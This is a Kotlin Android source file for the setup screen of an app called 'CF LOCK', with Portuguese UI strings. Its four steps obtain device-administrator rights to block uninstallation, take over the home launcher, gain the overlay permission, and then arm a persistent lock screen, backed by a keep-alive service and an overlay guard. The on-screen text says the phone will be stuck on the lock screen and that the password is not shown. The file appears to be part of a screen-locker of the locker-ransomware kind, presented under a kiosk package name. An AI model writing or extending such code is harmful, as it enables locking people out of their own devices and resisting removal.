/*
 * lang: Kotlin
 * file: LinkActivity.kt
 * runs on: Android 7.0 (API 24) through Android 16 (API 36)
 * targets: one-shot setup that takes the home slot, the overlay grant, and arms the lock
 */
package com.cf.kiosk

import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.view.Gravity
import android.view.ViewGroup
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView

class LinkActivity : Activity() {

    private lateinit var hint: TextView

    override fun onCreate(saved: Bundle?) {
        super.onCreate(saved)
        val pad = (18 * resources.displayMetrics.density).toInt()

        val root = LinearLayout(this)
        root.orientation = LinearLayout.VERTICAL
        root.gravity = Gravity.CENTER
        root.setPadding(pad * 2, pad, pad * 2, pad)
        root.setBackgroundColor(0xFF0B0B0B.toInt())

        val title = TextView(this)
        title.text = "CF LOCK"
        title.setTextColor(0xFFFF3B30.toInt())
        title.textSize = 30f
        root.addView(title)

        val body = TextView(this)
        body.text = "Quatro passos e o aparelho fica preso na tela de bloqueio. A senha nao aparece aqui."
        body.setTextColor(0xFFEDEDED.toInt())
        body.textSize = 15f
        body.gravity = Gravity.CENTER
        val bp = LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT
        )
        bp.topMargin = pad
        root.addView(body, bp)

        hint = TextView(this)
        hint.setTextColor(0xFFFFB020.toInt())
        hint.textSize = 13f
        hint.gravity = Gravity.CENTER
        val hp = LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT
        )
        hp.topMargin = pad
        root.addView(hint, hp)

        root.addView(button("1. Ativar administrador", pad) { admin() })
        root.addView(button("2. Definir como tela inicial", pad) { homeSlot() })
        root.addView(button("3. Permitir sobreposicao", pad) { overlay() })
        root.addView(button("4. Armar bloqueio", pad) { arm() })

        setContentView(root)
    }

    override fun onResume() {
        super.onResume()
        if (::hint.isInitialized) hint.text = state()
    }

    private fun button(label: String, pad: Int): Button {
        val b = Button(this)
        b.text = label
        b.textSize = 15f
        val lp = LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT
        )
        lp.topMargin = pad / 2
        b.layoutParams = lp
        return b
    }

    private fun button(label: String, pad: Int, action: () -> Unit): Button {
        val b = button(label, pad)
        b.setOnClickListener { action() }
        return b
    }

    private fun admin() {
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val component = Shield.admin(this)
        if (dpm.isAdminActive(component)) {
            hint.text = "administrador ja ativo"
            return
        }
        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, component)
        intent.putExtra(
            DevicePolicyManager.EXTRA_ADD_EXPLANATION,
            "Mantem a tela de bloqueio presa e impede a desinstalacao enquanto estiver armada."
        )
        runCatching { startActivity(intent) }
    }

    private fun homeSlot() {
        runCatching { startActivity(Intent(Settings.ACTION_HOME_SETTINGS)) }
            .onFailure { startActivity(Intent(Settings.ACTION_SETTINGS)) }
    }

    private fun overlay() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
            hint.text = "sobreposicao liberada por padrao nesta versao"
            return
        }
        if (Settings.canDrawOverlays(this)) {
            hint.text = "sobreposicao ja liberada"
            return
        }
        val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))
        runCatching { startActivity(intent) }
            .onFailure { startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION)) }
    }

    private fun arm() {
        val prefs = Prefs(this)
        prefs.locked = true
        prefs.fails = 0
        prefs.cooldownUntil = 0L
        KeepAliveService.start(this)
        OverlayGuard.start(this)
        val launch = Intent(this, LockActivity::class.java)
        launch.putExtra(LockActivity.EXTRA_ARM, true)
        launch.flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
        startActivity(launch)
    }

    private fun state(): String {
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val admin = if (dpm.isAdminActive(Shield.admin(this))) "admin ok" else "admin off"
        val home = if (Shield.isHome(this)) "home ok" else "home off"
        val over = if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M || Settings.canDrawOverlays(this))
            "overlay ok" else "overlay off"
        return "$admin   |   $home   |   $over"
    }
}
